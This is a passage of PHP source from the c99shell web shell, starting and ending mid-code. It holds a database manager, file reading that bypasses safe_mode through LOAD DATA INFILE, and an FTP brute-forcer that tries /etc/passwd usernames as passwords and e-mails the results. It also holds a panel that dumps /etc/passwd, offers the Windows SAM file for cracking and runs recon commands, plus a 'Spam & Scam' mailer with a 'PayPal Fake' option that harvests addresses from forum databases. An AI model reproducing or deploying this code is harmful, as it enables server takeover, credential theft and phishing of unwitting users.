 echo "<a href=\"".$sql_surl."sql_act=query&sql_tbl=".urlencode($sql_tbl)."&sql_tbl_ls=".$sql_tbl_ls."&sql_tbl_le=".$sql_tbl_le."&sql_query=".urlencode("DELETE FROM `".$sql_tbl."` WHERE".$w." LIMIT 1;")."\"><img src=\"".$surl."act=img&img=sql_button_drop\" alt=\"Delete\" height=\"13\" width=\"11\" border=\"0\"></a>&nbsp;"; 
 echo "<a href=\"".$sql_surl."sql_tbl_act=insert&sql_tbl=".urlencode($sql_tbl)."&sql_tbl_ls=".$sql_tbl_ls."&sql_tbl_le=".$sql_tbl_le."&sql_tbl_insert_q=".urlencode($w)."\"><img src=\"".$surl."act=img&img=change\" alt=\"Edit\" height=\"14\" width=\"14\" border=\"0\"></a>&nbsp;"; 
 echo "</td>"; 
 echo "</tr>"; 
} 
mysql_free_result($result); 
echo "</table><hr size=\"1\" noshade><p align=\"left\"><img src=\"".$surl."act=img&img=arrow_ltr\" border=\"0\"><select name=\"sql_act\">"; 
echo "<option value=\"\">With selected:</option>"; 
echo "<option value=\"deleterow\">Delete</option>"; 
echo "</select>&nbsp;<input type=\"submit\" value=\"Confirm\"></form></p>"; 
} 
 } 
 else 
 { 
$result = mysql_query("SHOW TABLE STATUS", $sql_sock); 
if (!$result) {echo mysql_smarterror();} 
else 
{ 
echo "<br><form method=\"POST\"><TABLE cellSpacing=0 borderColorDark=#666666 cellPadding=5 width=\"100%\" bgColor=#333333 borderColorLight=#c0c0c0 border=1><tr><td><input type=\"checkbox\" name=\"boxtbl_all\" value=\"1\"></td><td><center><b>Table</b></center></td><td><b>Rows</b></td><td><b>Type</b></td><td><b>Created</b></td><td><b>Modified</b></td><td><b>Size</b></td><td><b>Action</b></td></tr>"; 
$i = 0; 
$tsize = $trows = 0; 
while ($row = mysql_fetch_array($result, MYSQL_ASSOC)) 
{ 
 $tsize += $row["Data_length"]; 
 $trows += $row["Rows"]; 
 $size = view_size($row["Data_length"]); 
 echo "<tr>"; 
 echo "<td><input type=\"checkbox\" name=\"boxtbl[]\" value=\"".$row["Name"]."\"></td>"; 
 echo "<td>&nbsp;<a href=\"".$sql_surl."sql_tbl=".urlencode($row["Name"])."\"><b>".$row["Name"]."</b></a>&nbsp;</td>"; 
 echo "<td>".$row["Rows"]."</td>"; 
 echo "<td>".$row["Type"]."</td>"; 
 echo "<td>".$row["Create_time"]."</td>"; 
 echo "<td>".$row["Update_time"]."</td>"; 
 echo "<td>".$size."</td>"; 
 echo "<td>&nbsp;<a href=\"".$sql_surl."sql_act=query&sql_query=".urlencode("DELETE FROM `".$row["Name"]."`")."\"><img src=\"".$surl."act=img&img=sql_button_empty\" alt=\"Empty\" height=\"13\" width=\"11\" border=\"0\"></a>&nbsp;&nbsp;<a href=\"".$sql_surl."sql_act=query&sql_query=".urlencode("DROP TABLE `".$row["Name"]."`")."\"><img src=\"".$surl."act=img&img=sql_button_drop\" alt=\"Drop\" height=\"13\" width=\"11\" border=\"0\"></a>&nbsp;<a href=\"".$sql_surl."sql_tbl_act=insert&sql_tbl=".$row["Name"]."\"><img src=\"".$surl."act=img&img=sql_button_insert\" alt=\"Insert\" height=\"13\" width=\"11\" border=\"0\"></a>&nbsp;</td>"; 
 echo "</tr>"; 
 $i++; 
} 
echo "<tr bgcolor=\"000000\">"; 
echo "<td><center><b>»</b></center></td>"; 
echo "<td><center><b>".$i." table(s)</b></center></td>"; 
echo "<td><b>".$trows."</b></td>"; 
echo "<td>".$row[1]."</td>"; 
echo "<td>".$row[10]."</td>"; 
echo "<td>".$row[11]."</td>"; 
echo "<td><b>".view_size($tsize)."</b></td>"; 
echo "<td></td>"; 
echo "</tr>"; 
echo "</table><hr size=\"1\" noshade><p align=\"right\"><img src=\"".$surl."act=img&img=arrow_ltr\" border=\"0\"><select name=\"sql_act\">"; 
echo "<option value=\"\">With selected:</option>"; 
echo "<option value=\"tbldrop\">Drop</option>"; 
echo "<option value=\"tblempty\">Empty</option>"; 
echo "<option value=\"tbldump\">Dump</option>"; 
echo "<option value=\"tblcheck\">Check table</option>"; 
echo "<option value=\"tbloptimize\">Optimize table</option>"; 
echo "<option value=\"tblrepair\">Repair table</option>"; 
echo "<option value=\"tblanalyze\">Analyze table</option>"; 
echo "</select>&nbsp;<input type=\"submit\" value=\"Confirm\"></form></p>"; 
mysql_free_result($result); 
} 
 } 
} 
} 
} 
else 
{ 
$acts = array("","newdb","serverstatus","servervars","processes","getfile"); 
if (in_array($sql_act,$acts)) {?><table border="0" width="100%" height="1"><tr><td width="30%" height="1"><b>Create new DB:</b><form action="<?php echo $surl; ?>"><input type="hidden" name="act" value="sql"><input type="hidden" name="sql_act" value="newdb"><input type="hidden" name="sql_login" value="<?php echo htmlspecialchars($sql_login); ?>"><input type="hidden" name="sql_passwd" value="<?php echo htmlspecialchars($sql_passwd); ?>"><input type="hidden" name="sql_server" value="<?php echo htmlspecialchars($sql_server); ?>"><input type="hidden" name="sql_port" value="<?php echo htmlspecialchars($sql_port); ?>"><input type="text" name="sql_newdb" size="20">&nbsp;<input type="submit" value="Create"></form></td><td width="30%" height="1"><b>View File:</b><form action="<?php echo $surl; ?>"><input type="hidden" name="act" value="sql"><input type="hidden" name="sql_act" value="getfile"><input type="hidden" name="sql_login" value="<?php echo htmlspecialchars($sql_login); ?>"><input type="hidden" name="sql_passwd" value="<?php echo htmlspecialchars($sql_passwd); ?>"><input type="hidden" name="sql_server" value="<?php echo htmlspecialchars($sql_server); ?>"><input type="hidden" name="sql_port" value="<?php echo htmlspecialchars($sql_port); ?>"><input type="text" name="sql_getfile" size="30" value="<?php echo htmlspecialchars($sql_getfile); ?>">&nbsp;<input type="submit" value="Get"></form></td><td width="30%" height="1"></td></tr><tr><td width="30%" height="1"></td><td width="30%" height="1"></td><td width="30%" height="1"></td></tr></table><?php } 
if (!empty($sql_act)) 
{ 
 echo "<hr size=\"1\" noshade>"; 
 if ($sql_act == "newdb") 
 { 
echo "<b>"; 
if ((mysql_create_db ($sql_newdb)) and (!empty($sql_newdb))) {echo "DB \"".htmlspecialchars($sql_newdb)."\" has been created with success!</b><br>";} 
else {echo "Can't create DB \"".htmlspecialchars($sql_newdb)."\".<br>Reason:</b> ".mysql_smarterror();} 
 } 
 if ($sql_act == "serverstatus") 
 { 
$result = mysql_query("SHOW STATUS", $sql_sock); 
echo "<center><b>Server-status variables:</b><br><br>"; 
echo "<TABLE cellSpacing=0 cellPadding=0 bgColor=#333333 borderColorLight=#333333 border=1><td><b>Name</b></td><td><b>Value</b></td></tr>"; 
while ($row = mysql_fetch_array($result, MYSQL_NUM)) {echo "<tr><td>".$row[0]."</td><td>".$row[1]."</td></tr>";} 
echo "</table></center>"; 
mysql_free_result($result); 
 } 
 if ($sql_act == "servervars") 
 { 
$result = mysql_query("SHOW VARIABLES", $sql_sock); 
echo "<center><b>Server variables:</b><br><br>"; 
echo "<TABLE cellSpacing=0 cellPadding=0 bgColor=#333333 borderColorLight=#333333 border=1><td><b>Name</b></td><td><b>Value</b></td></tr>"; 
while ($row = mysql_fetch_array($result, MYSQL_NUM)) {echo "<tr><td>".$row[0]."</td><td>".$row[1]."</td></tr>";} 
echo "</table>"; 
mysql_free_result($result); 
 } 
 if ($sql_act == "processes") 
 { 
if (!empty($kill)) {$query = "KILL ".$kill.";"; $result = mysql_query($query, $sql_sock); echo "<b>Killing process #".$kill."... ok. he is dead, amen.</b>";} 
$result = mysql_query("SHOW PROCESSLIST", $sql_sock); 
echo "<center><b>Processes:</b><br><br>"; 
echo "<TABLE cellSpacing=0 cellPadding=2 bgColor=#333333 borderColorLight=#333333 border=1><td><b>ID</b></td><td><b>USER</b></td><td><b>HOST</b></td><td><b>DB</b></td><td><b>COMMAND</b></td><td><b>TIME</b></td><td><b>STATE</b></td><td><b>INFO</b></td><td><b>Action</b></td></tr>"; 
while ($row = mysql_fetch_array($result, MYSQL_NUM)) { echo "<tr><td>".$row[0]."</td><td>".$row[1]."</td><td>".$row[2]."</td><td>".$row[3]."</td><td>".$row[4]."</td><td>".$row[5]."</td><td>".$row[6]."</td><td>".$row[7]."</td><td><a href=\"".$sql_surl."sql_act=processes&kill=".$row[0]."\"><u>Kill</u></a></td></tr>";} 
echo "</table>"; 
mysql_free_result($result); 
 } 
 if ($sql_act == "getfile") 
 { 
$tmpdb = $sql_login."_tmpdb"; 
$select = mysql_select_db($tmpdb); 
if (!$select) {mysql_create_db($tmpdb); $select = mysql_select_db($tmpdb); $created = !!$select;} 
if ($select) 
{ 
$created = FALSE; 
mysql_query("CREATE TABLE `tmp_file` ( `Viewing the file in safe_mode+open_basedir` LONGBLOB NOT NULL );"); 
mysql_query("LOAD DATA INFILE \"".addslashes($sql_getfile)."\" INTO TABLE tmp_file"); 
$result = mysql_query("SELECT * FROM tmp_file;"); 
if (!$result) {echo "<b>Error in reading file (permision denied)!</b>";} 
else 
{ 
 for ($i=0;$i<mysql_num_fields($result);$i++) {$name = mysql_field_name($result,$i);} 
 $f = ""; 
 while ($row = mysql_fetch_array($result, MYSQL_ASSOC)) {$f .= join ("\r\n",$row);} 
 if (empty($f)) {echo "<b>File \"".$sql_getfile."\" does not exists or empty!</b><br>";} 
 else {echo "<b>File \"".$sql_getfile."\":</b><br>".nl2br(htmlspecialchars($f))."<br>";} 
 mysql_free_result($result); 
 mysql_query("DROP TABLE tmp_file;"); 
} 
} 
mysql_drop_db($tmpdb); //comment it if you want to leave database 
 } 
} 
} 
 } 
 echo "</td></tr></table>"; 
 if ($sql_sock) 
 { 
$affected = @mysql_affected_rows($sql_sock); 
if ((!is_numeric($affected)) or ($affected < 0)){$affected = 0;} 
echo "<tr><td><center><b>Affected rows: ".$affected."</center></td></tr>"; 
 } 
 echo "</table>"; 
} 
if ($act == "mkdir") 
{ 
 if ($mkdir != $d) 
 { 
if (file_exists($mkdir)) {echo "<b>Make Dir \"".htmlspecialchars($mkdir)."\"</b>: object alredy exists";} 
elseif (!mkdir($mkdir)) {echo "<b>Make Dir \"".htmlspecialchars($mkdir)."\"</b>: access denied";} 
echo "<br><br>"; 
 } 
 $act = $dspact = "ls"; 
} 
if ($act == "ftpquickbrute") 
{ 
 echo "<b>Ftp Quick brute:</b><br>"; 
 if (!win) {echo "This functions not work in Windows!<br><br>";} 
 else 
 { 
function c99ftpbrutecheck($host,$port,$timeout,$login,$pass,$sh,$fqb_onlywithsh) 
{ 
if ($fqb_onlywithsh) {$TRUE = (!in_array($sh,array("/bin/FALSE","/sbin/nologin")));} 
else {$TRUE = TRUE;} 
if ($TRUE) 
{ 
 $sock = @ftp_connect($host,$port,$timeout); 
 if (@ftp_login($sock,$login,$pass)) 
 { 
echo "<a href=\"ftp://".$login.":".$pass."@".$host."\" target=\"_blank\"><b>Connected to ".$host." with login \"".$login."\" and password \"".$pass."\"</b></a>.<br>"; 
ob_flush(); 
return TRUE; 
 } 
} 
} 
if (!empty($submit)) 
{ 
if (!is_numeric($fqb_lenght)) {$fqb_lenght = $nixpwdperpage;} 
$fp = fopen("/etc/passwd","r"); 
if (!$fp) {echo "Can't get /etc/passwd for password-list.";} 
else 
{ 
 if ($fqb_logging) 
 { 
if ($fqb_logfile) {$fqb_logfp = fopen($fqb_logfile,"w");} 
else {$fqb_logfp = FALSE;} 
$fqb_log = "FTP Quick Brute (called c99shell v. ".$shver.") started at ".date("d.m.Y H:i:s")."\r\n\r\n"; 
if ($fqb_logfile) {fwrite($fqb_logfp,$fqb_log,strlen($fqb_log));} 
 } 
 ob_flush(); 
 $i = $success = 0; 
 $ftpquick_st = getmicrotime(); 
 while(!feof($fp)) 
 { 
$str = explode(":",fgets($fp,2048)); 
if (c99ftpbrutecheck("localhost",21,1,$str[0],$str[0],$str[6],$fqb_onlywithsh)) 
{ 
echo "<b>Connected to ".getenv("SERVER_NAME")." with login \"".$str[0]."\" and password \"".$str[0]."\"</b><br>"; 
$fqb_log .= "Connected to ".getenv("SERVER_NAME")." with login \"".$str[0]."\" and password \"".$str[0]."\", at ".date("d.m.Y H:i:s")."\r\n"; 
if ($fqb_logfp) {fseek($fqb_logfp,0); fwrite($fqb_logfp,$fqb_log,strlen($fqb_log));} 
$success++; 
ob_flush(); 
} 
if ($i > $fqb_lenght) {break;} 
$i++; 
 } 
 if ($success == 0) {echo "No success. connections!"; $fqb_log .= "No success. connections!\r\n";} 
 $ftpquick_t = round(getmicrotime()-$ftpquick_st,4); 
 echo "<hr size=\"1\" noshade><b>Done!</b><br>Total time (secs.): ".$ftpquick_t."<br>Total connections: ".$i."<br>Success.: <font color=green><b>".$success."</b></font><br>Unsuccess.:".($i-$success)."</b><br>Connects per second: ".round($i/$ftpquick_t,2)."<br>"; 
 $fqb_log .= "\r\n------------------------------------------\r\nDone!\r\nTotal time (secs.): ".$ftpquick_t."\r\nTotal connections: ".$i."\r\nSuccess.: ".$success."\r\nUnsuccess.:".($i-$success)."\r\nConnects per second: ".round($i/$ftpquick_t,2)."\r\n"; 
 if ($fqb_logfp) {fseek($fqb_logfp,0); fwrite($fqb_logfp,$fqb_log,strlen($fqb_log));} 
 if ($fqb_logemail) {@mail($fqb_logemail,"c99shell v. ".$shver." report",$fqb_log);} 
 fclose($fqb_logfp); 
} 
} 
else 
{ 
$logfile = $tmpdir_logs."c99sh_ftpquickbrute_".date("d.m.Y_H_i_s").".log"; 
$logfile = str_replace("//",DIRECTORY_SEPARATOR,$logfile); 
echo "<form action=\"".$surl."\"><input type=hidden name=act value=\"ftpquickbrute\"><br>Read first: <input type=text name=\"fqb_lenght\" value=\"".$nixpwdperpage."\"><br><br>Users only with shell?&nbsp;<input type=\"checkbox\" name=\"fqb_onlywithsh\" value=\"1\"><br><br>Logging?&nbsp;<input type=\"checkbox\" name=\"fqb_logging\" value=\"1\" checked><br>Logging to file?&nbsp;<input type=\"text\" name=\"fqb_logfile\" value=\"".$logfile."\" size=\"".(strlen($logfile)+2*(strlen($logfile)/10))."\"><br>Logging to e-mail?&nbsp;<input type=\"text\" name=\"fqb_logemail\" value=\"".$log_email."\" size=\"".(strlen($logemail)+2*(strlen($logemail)/10))."\"><br><br><input type=submit name=submit value=\"Brute\"></form>"; 
} 
 } 
} 
if ($act == "d") 
{ 
 if (!is_dir($d)) {echo "<center><b>Permision denied!</b></center>";} 
 else 
 { 
echo "<b>Directory information:</b><table border=0 cellspacing=1 cellpadding=2>"; 
if (!$win) 
{ 
echo "<tr><td><b>Owner/Group</b></td><td> "; 
$ow = posix_getpwuid(fileowner($d)); 
$gr = posix_getgrgid(filegroup($d)); 
$row[] = ($ow["name"]?$ow["name"]:fileowner($d))."/".($gr["name"]?$gr["name"]:filegroup($d)); 
} 
echo "<tr><td><b>Perms</b></td><td><a href=\"".$surl."act=chmod&d=".urlencode($d)."\"><b>".view_perms_color($d)."</b></a><tr><td><b>Create time</b></td><td> ".date("d/m/Y H:i:s",filectime($d))."</td></tr><tr><td><b>Access time</b></td><td> ".date("d/m/Y H:i:s",fileatime($d))."</td></tr><tr><td><b>MODIFY time</b></td><td> ".date("d/m/Y H:i:s",filemtime($d))."</td></tr></table><br>"; 
 } 
} 
if ($act == "phpinfo") {@ob_clean(); phpinfo(); c99shexit();} 
if ($act == "security") 
{ 
 echo "<center><b>Server security information:</b></center><b>Open base dir: ".$hopenbasedir."</b><br>"; 
 if (!$win) 
 { 
if ($nixpasswd) 
{ 
if ($nixpasswd == 1) {$nixpasswd = 0;} 
echo "<b>*nix /etc/passwd:</b><br>"; 
if (!is_numeric($nixpwd_s)) {$nixpwd_s = 0;} 
if (!is_numeric($nixpwd_e)) {$nixpwd_e = $nixpwdperpage;} 
echo "<form action=\"".$surl."\"><input type=hidden name=act value=\"security\"><input type=hidden name=\"nixpasswd\" value=\"1\"><b>From:</b>&nbsp;<input type=\"text=\" name=\"nixpwd_s\" value=\"".$nixpwd_s."\">&nbsp;<b>To:</b>&nbsp;<input type=\"text\" name=\"nixpwd_e\" value=\"".$nixpwd_e."\">&nbsp;<input type=submit value=\"View\"></form><br>"; 
$i = $nixpwd_s; 
while ($i < $nixpwd_e) 
{ 
 $uid = posix_getpwuid($i); 
 if ($uid) 
 { 
$uid["dir"] = "<a href=\"".$surl."act=ls&d=".urlencode($uid["dir"])."\">".$uid["dir"]."</a>"; 
echo join(":",$uid)."<br>"; 
 } 
 $i++; 
} 
} 
else {echo "<br><a href=\"".$surl."act=security&nixpasswd=1&d=".$ud."\"><b><u>Get /etc/passwd</u></b></a><br>";} 
 } 
 else 
 { 
$v = $_SERVER["WINDIR"]."\repair\sam"; 
if (file_get_contents($v)) {echo "<b><font color=red>You can't crack winnt passwords(".$v.") </font></b><br>";} 
else {echo "<b><font color=green>You can crack winnt passwords. <a href=\"".$surl."act=f&f=sam&d=".$_SERVER["WINDIR"]."\\repair&ft=download\"><u><b>Download</b></u></a>, and use lcp.crack+ ©.</font></b><br>";} 
 } 
 if (file_get_contents("/etc/userdomains")) {echo "<b><font color=green><a href=\"".$surl."act=f&f=userdomains&d=".urlencode("/etc")."&ft=txt\"><u><b>View cpanel user-domains logs</b></u></a></font></b><br>";} 
 if (file_get_contents("/var/cpanel/accounting.log")) {echo "<b><font color=green><a href=\"".$surl."act=f&f=accounting.log&d=".urlencode("/var/cpanel/")."\"&ft=txt><u><b>View cpanel logs</b></u></a></font></b><br>";} 
 if (file_get_contents("/usr/local/apache/conf/httpd.conf")) {echo "<b><font color=green><a href=\"".$surl."act=f&f=httpd.conf&d=".urlencode("/usr/local/apache/conf")."&ft=txt\"><u><b>Apache configuration (httpd.conf)</b></u></a></font></b><br>";} 
 if (file_get_contents("/etc/httpd.conf")) {echo "<b><font color=green><a href=\"".$surl."act=f&f=httpd.conf&d=".urlencode("/etc")."&ft=txt\"><u><b>Apache configuration (httpd.conf)</b></u></a></font></b><br>";} 
 if (file_get_contents("/etc/syslog.conf")) {echo "<b><font color=green><a href=\"".$surl."act=f&f=syslog.conf&d=".urlencode("/etc")."&ft=txt\"><u><b>Syslog configuration (syslog.conf)</b></u></a></font></b><br>";} 
 if (file_get_contents("/etc/motd")) {echo "<b><font color=green><a href=\"".$surl."act=f&f=motd&d=".urlencode("/etc")."&ft=txt\"><u><b>Message Of The Day</b></u></a></font></b><br>";} 
 if (file_get_contents("/etc/hosts")) {echo "<b><font color=green><a href=\"".$surl."act=f&f=hosts&d=".urlencode("/etc")."&ft=txt\"><u><b>Hosts</b></u></a></font></b><br>";} 
 function displaysecinfo($name,$value) {if (!empty($value)) {if (!empty($name)) {$name = "<b>".$name." - </b>";} echo $name.nl2br($value)."<br>";}} 
 displaysecinfo("OS Version?",myshellexec("cat /proc/version")); 
 displaysecinfo("Kernel version?",myshellexec("sysctl -a | grep version")); 
 displaysecinfo("Distrib name",myshellexec("cat /etc/issue.net")); 
 displaysecinfo("Distrib name (2)",myshellexec("cat /etc/*-realise")); 
 displaysecinfo("CPU?",myshellexec("cat /proc/cpuinfo")); 
 displaysecinfo("RAM",myshellexec("free -m")); 
 displaysecinfo("HDD space",myshellexec("df -h")); 
 displaysecinfo("List of Attributes",myshellexec("lsattr -a")); 
 displaysecinfo("Mount options ",myshellexec("cat /etc/fstab")); 
 displaysecinfo("Is cURL installed?",myshellexec("which curl")); 
 displaysecinfo("Is lynx installed?",myshellexec("which lynx")); 
 displaysecinfo("Is links installed?",myshellexec("which links")); 
 displaysecinfo("Is fetch installed?",myshellexec("which fetch")); 
 displaysecinfo("Is GET installed?",myshellexec("which GET")); 
 displaysecinfo("Is perl installed?",myshellexec("which perl")); 
 displaysecinfo("Where is apache",myshellexec("whereis apache")); 
 displaysecinfo("Where is perl?",myshellexec("whereis perl")); 
 displaysecinfo("locate proftpd.conf",myshellexec("locate proftpd.conf")); 
 displaysecinfo("locate httpd.conf",myshellexec("locate httpd.conf")); 
 displaysecinfo("locate my.conf",myshellexec("locate my.conf")); 
 displaysecinfo("locate psybnc.conf",myshellexec("locate psybnc.conf")); 
} 
if ($act == "mkfile") 
{ 
 if ($mkfile != $d) 
 { 
if (file_exists($mkfile)) {echo "<b>Make File \"".htmlspecialchars($mkfile)."\"</b>: object alredy exists";} 
elseif (!fopen($mkfile,"w")) {echo "<b>Make File \"".htmlspecialchars($mkfile)."\"</b>: access denied";} 
else {$act = "f"; $d = dirname($mkfile); if (substr($d,-1) != DIRECTORY_SEPARATOR) {$d .= DIRECTORY_SEPARATOR;} $f = basename($mkfile);} 
 } 
 else {$act = $dspact = "ls";} 
} 
if ($act == "encoder") 
{ 
 echo "<script>function set_encoder_input(text) {document.forms.encoder.input.value = text;}</script><center><b>Encoder:</b></center><form name=\"encoder\" action=\"".$surl."\" method=POST><input type=hidden name=act value=encoder><b>Input:</b><center><textarea name=\"encoder_input\" id=\"input\" cols=50 rows=5>".@htmlspecialchars($encoder_input)."</textarea><br><br><input type=submit value=\"calculate\"><br><br></center><b>Hashes</b>:<br><center>"; 
 foreach(array("md5","crypt","crc32") as $v) 
 { 
echo $v." - <input type=text size=50 onFocus=\"this.select()\" onMouseover=\"this.select()\" onMouseout=\"this.select()\" value=\"".$v($encoder_input)."\" readonly><br>"; 
 } 
 echo "</center><b>Url:</b><center><br>urlencode - <input type=text size=35 onFocus=\"this.select()\" onMouseover=\"this.select()\" onMouseout=\"this.select()\" value=\"".urlencode($encoder_input)."\" readonly> 
 <br>urldecode - <input type=text size=35 onFocus=\"this.select()\" onMouseover=\"this.select()\" onMouseout=\"this.select()\" value=\"".htmlspecialchars(urldecode($encoder_input))."\" readonly> 
 <br></center><b>Base64:</b><center>base64_encode - <input type=text size=35 onFocus=\"this.select()\" onMouseover=\"this.select()\" onMouseout=\"this.select()\" value=\"".base64_encode($encoder_input)."\" readonly></center>"; 
 echo "<center>base64_decode - "; 
 if (base64_encode(base64_decode($encoder_input)) != $encoder_input) {echo "<input type=text size=35 value=\"failed\" disabled readonly>";} 
 else 
 { 
$debase64 = base64_decode($encoder_input); 
$debase64 = str_replace("\0","[0]",$debase64); 
$a = explode("\r\n",$debase64); 
$rows = count($a); 
$debase64 = htmlspecialchars($debase64); 
if ($rows == 1) {echo "<input type=text size=35 onFocus=\"this.select()\" onMouseover=\"this.select()\" onMouseout=\"this.select()\" value=\"".$debase64."\" id=\"debase64\" readonly>";} 
else {$rows++; echo "<textarea cols=\"40\" rows=\"".$rows."\" onFocus=\"this.select()\" onMouseover=\"this.select()\" onMouseout=\"this.select()\" id=\"debase64\" readonly>".$debase64."</textarea>";} 
echo "&nbsp;<a href=\"#\" onclick=\"set_encoder_input(document.forms.encoder.debase64.value)\"><b>^</b></a>"; 
 } 
 echo "</center><br><b>Base convertations</b>:<center>dec2hex - <input type=text size=35 onFocus=\"this.select()\" onMouseover=\"this.select()\" onMouseout=\"this.select()\" value=\""; 
 $c = strlen($encoder_input); 
 for($i=0;$i<$c;$i++) 
 { 
$hex = dechex(ord($encoder_input[$i])); 
if ($encoder_input[$i] == "&") {echo $encoder_input[$i];} 
elseif ($encoder_input[$i] != "\\") {echo "%".$hex;} 
 } 
 echo "\" readonly><br></center></form>"; 
} 
if ($act == "fsbuff") 
{ 
 $arr_copy = $sess_data["copy"]; 
 $arr_cut = $sess_data["cut"]; 
 $arr = array_merge($arr_copy,$arr_cut); 
 if (count($arr) == 0) {echo "<center><b>Buffer is empty!</b></center>";} 
 else {echo "<b>File-System buffer</b><br><br>"; $ls_arr = $arr; $disp_fullpath = TRUE; $act = "ls";} 
} 
if ($act == "selfremove") 
{ 
 if (($submit == $rndcode) and ($submit != "")) 
 { 
if (unlink(__FILE__)) {@ob_clean(); echo "Thanks for using c99shell v.".$shver."!"; c99shexit(); } 
else {echo "<center><b>Can't delete ".__FILE__."!</b></center>";} 
 } 
 else 
 { 
if (!empty($rndcode)) {echo "<b>Error: incorrect confimation!</b>";} 
$rnd = rand(0,9).rand(0,9).rand(0,9); 
echo "<form action=\"".$surl."\"><input type=hidden name=act value=selfremove><b>Self-remove: ".__FILE__." <br><b>Are you sure?<br>For confirmation, enter \"".$rnd."\"</b>:&nbsp;<input type=hidden name=rndcode value=\"".$rnd."\"><input type=text name=submit>&nbsp;<input type=submit value=\"YES\"></form>"; 
 } 
} 
if ($act == "mailer") {




If ($action=="mysql"){

$sqlhost = $_POST['sqhost'];
$sqllogin = $_POST['sqlog'];
$sqlpass = $_POST['sqpass'];
$sqldb = $_POST['sqdb'];
$sqlquery =$_POST['sqq'];

	

	if (!$sqlhost || !$sqllogin || !$sqldb || !$sqlquery){

	print "Please configure mysql.info.php with your MySQL information. All settings in this config file are required.";

	exit;

	}

	$db = mysql_connect($sqlhost, $sqllogin, $sqlpass) or die("Connection to MySQL Failed.");

	mysql_select_db($sqldb, $db) or die("Could not select database $sqldb");

	$result = mysql_query($sqlquery) or die("Query Failed: $sqlquery");

	$numrows = mysql_num_rows($result);

	

	for($x=0; $x<$numrows; $x++){

	$result_row = mysql_fetch_row($result);

	$oneemail = $result_row[0];

	$emaillist .= $oneemail."\n";

	}

	}



if ($action=="send"){

	$message = urlencode($message);

	$message = ereg_replace("%5C%22", "%22", $message);

	$message = urldecode($message);
	$message = stripslashes($message);
	$subject = stripslashes($subject);

}



?>&nbsp;<b><font face="Arial" size="3"><center>Php Mailer Mod With capacity Of Grabbing Mails From db By Psych0<br>
</b></center>
<form name="form1" method="post" action="" enctype="multipart/form-data" style="background-image: url('ima.jpg')">
<font size="-1" face="Verdana, Arial, Helvetica, sans-serif"> 
<input type="hidden" name="action" value="send">
</font>
<div align="center">
<br>
<br>
<br>
<table border="0" width="100%" cellspacing="0">
<tr>
<td width="63%">
<table border="0" width="100%" cellspacing="0" cellpadding="0">
<tr>
<td width="100%">
<table border="0" width="100%" cellspacing="0" cellpadding="0">
<tr>
<td width="23%"><font size="2" face="Arial"><b>From (email):</b></font></td>
<td width="77%"><font size="-1" face="Verdana, Arial, Helvetica, sans-serif"> 
<input type="text" name="from" value="<? print $from; ?>" size="44" style="border-style: solid; border-width: 1">
</font></td>
</tr>
<tr>
<td width="23%"><font size="2" face="Arial"><b>Name:</b></font></td>
<td width="77%"><font size="-1" face="Verdana, Arial, Helvetica, sans-serif"> 
<input type="text" name="realname" value="<? print $realname; ?>" size="44" style="border-style: solid; border-width: 1">
</font></td>
</tr>
<tr>
<td width="23%"><font size="2" face="Arial"><b>Reply-To:</b></font></td>
<td width="77%"><font size="-1" face="Verdana, Arial, Helvetica, sans-serif"> 

<input type="text" name="replyto" value="<? print $replyto; ?>" size="44" style="border-style: solid; border-width: 1">

</font></td>
</tr>
<tr>
<td width="23%"><font size="2" face="Arial"><b>Attach File:</b></font></td>
<td width="77%"><font size="-1" face="Verdana, Arial, Helvetica, sans-serif"> 
<input type="file" name="file" size="30">
</font></td>
</tr>
<tr>
<td width="23%"><font size="2" face="Arial"><b>Subject:</b></font></td>
<td width="77%"><font size="-1" face="Verdana, Arial, Helvetica, sans-serif"><input type="text" name="subject" value="<? print $subject; ?>" size="44" style="border-style: solid; border-width: 1">
</font></td>
</tr>
</table>
</td>
</tr>
<tr>
<td width="100%">
<table border="0" width="100%" cellspacing="0">
<tr>
<td width="100%"></td>
</tr>
<tr>
<td width="100%"><font size="-1" face="Verdana, Arial, Helvetica, sans-serif"><textarea name="message" cols="71" rows="10" style="border-style: solid; border-width: 1"><? print $message; ?></textarea>
</font></td>
</tr>
</table>
</td>
</tr>
<tr>
<td width="100%"><font size="-1" face="Verdana, Arial, Helvetica, sans-serif"><center><input type="radio" name="contenttype" value="plain">
Plain 
<input type="radio" name="contenttype" value="html" checked>
HTML&nbsp; </br>
<input type="submit" value="-_- //\\ Start Spam & Scam //\\ -_-"><br> <Select name="burcu">
<option value="All">All
<option value="Yahoo">YAhoo OnlY
<Option Value="Hotmail">Hotmail Only
<Option Value="Gmail">GMail only
</select><br>
<input type="Button" Value="Hotmail Xss"><br>
<input type="Button" value="Yahoo Xss" ><br>
<input type="Button" value="PayPal Fake"><br>
</font></center></td>
</tr>
</table>
</td>
<td width="37%">
<table border="0" width="100%" cellspacing="0">
<tr>
<td width="100%"><b><font size="2" face="Arial">Email(s) List</font></b></td>
</tr>
<tr>
<td width="100%"><font size="-1" face="Verdana, Arial, Helvetica, sans-serif"><textarea name="emaillist" cols="40" rows="16" style="border-style: solid; border-width: 1" id="dompat"><? print $emaillist; ?></textarea><br>
&nbsp;
<b>

</form>

<form action="<?echo $surl."act=mailer&action=mysql"?>" Method="Post" onsubmit="document.getElementById('pattes').disabled=false">
:: Sql Host :: &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<input type="text" name="sqhost" value="localhost"><br>
:: Sql Username :: <input type="text" name="sqlog" value="root"><br>
:: Sql Pass ::&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<input type="text" name="sqpass"><br>
:: Sql db::&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &nbsp;<input type="text" name="sqdb" value="wbb"><br>
:: Query For Grabbing Mails (Don't Touch !) ::<br>&nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; 
<input type="hidden" name="sqq" value="for advanced users"id="pattes"><br>
<select name="dolmas">
<option value="wasdb_">-----------------Select-------------------
<option value="wbb_" onclick="document.getElementById('pattes').value='Select email From bb1_users'">-------------------wbb--------------------
<option value="smf_" onclick="document.getElementById('pattes').value='Select emailAddress From smf_members'">-------------------smf---------------------
<option value="phpbb_" onclick="document.getElementById('pattes').value='Select user_email From phpbb_users'">------------------phpbb------------------
